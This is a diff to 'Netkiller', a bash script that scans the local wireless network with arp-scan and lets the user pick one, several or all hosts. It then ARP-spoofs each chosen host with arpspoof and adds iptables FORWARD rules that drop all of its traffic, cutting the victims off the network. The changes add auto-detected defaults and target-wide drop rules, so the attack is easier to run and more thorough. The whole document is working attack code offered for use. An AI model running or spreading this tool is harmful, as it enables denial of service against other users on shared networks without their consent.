@@ -28,45 +28,66 @@ WLAN=$(ip link show | awk -F': ' '/^[0-9]+: wl/{print $2}' | head -n 1)
 # Detect gateway
 GW=$(ip route show dev "$WLAN" | awk '/default/ {print $3}')
 
-# Detect subnet
-CIDR=$(ip addr show "$WLAN" | grep 'inet ' | awk '{print $2}')
-
 # Detect device IP
 IP=$(ip addr show "$WLAN" | awk '/inet / {print $2}' | cut -d/ -f1)
+
+# Detect cidr
+IP_CIDR=$(ip -4 addr show "$WLAN" | grep -oP 'inet \K[\d./]+')
+SUB=$(ipcalc -n "$IP_CIDR" | grep "Network:" | awk '{print $2}')
+
 echo ""
 
-echo "Current Network Information"
-echo "[*] Network Interface: $WLAN"
+echo "[ Current Network Information] "
+echo "[*] Interface: $WLAN"
 echo "[*] Gateway IP: $GW"
-echo "[*] Subnet IP: $CIDR"
+echo "[*] Subnet IP: $SUB"
 echo "[*] Device IP: $IP"
 echo ""
 
-read -rp "Enter Wireless Interface: " INTERFACE
+# Detect Interface
+echo "Enter Wireless Interface: Skip for default"
+read -r -p "> $WLAN " WLN
+INTERFACE="${WLN:-$WLAN}"
 echo ""
 
-read -rp "Enter Router Gateway IP: " GATEWAY
+# Detect Gateway IP
+echo "Enter Router Gateway IP: Skip for default"
+read -r -p "> $GW " INET
+GATEWAY="${INET:-$GW}"
 echo ""
 
-read -rp "Enter Subnet Mask (e.g 10.0.0.0/20): " NETWORK_CIDR
+# Detect Subnet
+echo "Enter Subnet mask: Skip for default"
+read -r -p "> $SUB " IPS
+NETWORK_CIDR="${IPS:-$SUB}"
 echo ""
 
-MYIP="$IP"
-
-echo "Target Network Configuration"
-echo "[*] Target Network Interface: $INTERFACE"
-echo "[*] Target Gateway IP: $GATEWAY"
-echo "[*] Target Subnet IP: $NETWORK_CIDR"
-echo "[*] This Device IP: $MYIP"
+# Detect Device IP
+echo "Enter Device IP: Skip for default"
+read -r -p "> $IP " DEVIP
+MYIP="${DEVIP:-$IP}"
 echo ""
+
+# Prompt configuration
+echo "[ Target Network Configuration ]"
+echo "[*] INTERFACE: | $INTERFACE"
+echo "[*] GATEWAY:   | $GATEWAY"
+echo "[*] DEVICE IP: | $MYIP"
+echo "[*] TARGETS:   | $SUB"
+echo ""
+
+# Run arp-scan to scan the target
+echo "[*] [ Scanning for Targets ] [*]"
+echo""
+arp-scan --retry=5 --bandwidth=100000 --random --localnet --interface="$WLAN"
+echo ""
+sleep 3s
 
 # Target selection
 echo "Select Attack Type!"
 echo "1) Single Target IP"
 echo "2) Multiple Target IP's (comma separated)"
 echo "3) Target All IP's in Subnet"
-
-echo ""
 read -rp "Enter choice [1-3]: " target_type
 echo ""
 
@@ -82,8 +103,10 @@ case $target_type in
         IFS=',' read -ra TARGETS <<< "$target_input"
         ;;
     3)
-        echo "Target All Users IP's in Subnet: e.g 10.0.0.1/20"
-        read -rp "Enter Subnet: " subnet
+        echo "Target All Users IP's: Enter for default"
+        read -r -p "> $SUB " IPS
+        subnet="${IPS:-$SUB}"
+
 
         # Validate subnet
         if ! ipcalc -n "$subnet" &>/dev/null; then
@@ -179,20 +202,21 @@ iptables -P FORWARD DROP
 PIDS=()
 for TARGET in "${TARGETS[@]}"; do
     echo ""
-    echo "Netkiller blocking the connection of $TARGET"
+    echo "Netkiller kill the connection of $TARGET"
 
     # Bidirectional arp spoofing
    ( arpspoof -i "$INTERFACE" -t "$TARGET" -r "$GATEWAY" >/dev/null 2>&1 ) &
     PIDS+=($!)
 
     # Set iptables rules to block/drop traffic
-    iptables -I FORWARD ! -s "$MYIP" -d "$GATEWAY" -j DROP
+    iptables -I FORWARD -s "$TARGET" -j DROP
+    iptables -I FORWARD -d "$TARGET" -j DROP
 done
 
 # Function to clean up
 cleanup() {
     exec &>/dev/null
-    
+
     echo -e "\nCleaning up..."
     # Kill all arpspoof processes
     for pid in "${PIDS[@]}"; do
